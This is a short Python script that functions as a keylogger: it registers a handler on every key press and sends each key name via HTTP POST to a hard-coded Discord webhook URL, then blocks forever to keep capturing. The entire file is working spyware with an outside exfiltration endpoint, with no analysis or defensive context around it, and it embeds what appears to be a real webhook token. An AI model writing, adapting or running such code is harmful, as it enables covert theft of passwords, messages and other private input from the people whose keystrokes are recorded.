import keyboard
import requests

url ="https://discord.com/api/webhooks/1289809072660414546/zTMPVicrIc9QT-QYz0xJ9qdt-37Ph6zq7iXePI3zPjRCcH_uJ4PXUMU94L-vJo-6yp-J"



def on_key_press(event):
    data = {
    "content":event.name
    }
    requests.post(url=url, data=data)
    
    
keyboard.on_press(on_key_press)
keyboard.wait()